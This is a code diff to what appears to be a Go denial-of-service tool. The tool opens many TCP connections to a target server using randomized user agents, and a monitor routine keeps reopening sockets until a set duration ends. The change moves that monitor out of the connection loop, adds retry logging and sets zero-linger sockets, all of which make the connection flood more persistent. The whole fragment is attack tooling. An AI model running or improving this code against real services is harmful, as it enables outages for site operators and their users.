@@ -38,7 +38,8 @@ func main() {
 		log.Fatalf("%v\n", tcperr)
 	}
 
-	for i := 1; i <= cons; i++ {
+	i := 0
+	for ; i <= cons; i++ {
 		agent := attack.agents[rand.Intn(len(attack.agents))]
 
 		connection, err := createConnection(endpoint, attack.serverURL.Path, agent, i, quit)
@@ -49,7 +50,6 @@ func main() {
 				// connection refuse from the server, socket opening problems
 				log.Println(err.Err)
 				log.Println("Starting a new monitoring routine")
-				go monitor(attack, endpoint, attack.serverURL.Path, i, quit)
 			case *net.DNSError:
 				// if we reached this case, then most
 				// probably the host does not exists
@@ -64,6 +64,8 @@ func main() {
 			go connection.start(attack.timeout, quit)
 		}
 	}
+
+	go monitor(attack, endpoint, attack.serverURL.Path, i, quit)
 
 	time.Sleep(time.Second * time.Duration(*attack.duration))
 	close(quit)
@@ -117,13 +119,14 @@ func monitor(attack *attackParams, address *net.TCPAddr, path string, id int, qu
 		case <-quit:
 			return
 		default:
-			time.Sleep(retry)
-
 			log.Println("Trying to open a new socket from the monitor routine...")
 
 			connection, err := createConnection(address, path, attack.agents[rand.Intn(len(attack.agents))], id, quit)
 			if err != nil {
+				time.Sleep(retry)
 				continue
+			} else {
+				log.Printf("Successfully opened another socket = [%d]\n", id)
 			}
 
 			go connection.start(attack.timeout, quit)
@@ -147,6 +150,12 @@ func createConnection(address *net.TCPAddr, path, agent string, id int, quit cha
 	conn, err := net.DialTCP("tcp", nil, address)
 	if err != nil {
 		return nil, err.(*net.OpError)
+	}
+
+	// abandon any unsent data
+	linerr := conn.SetLinger(0)
+	if linerr != nil {
+		return nil, linerr.(*net.OpError)
 	}
 
 	return &connection{&payload, id, conn}, nil
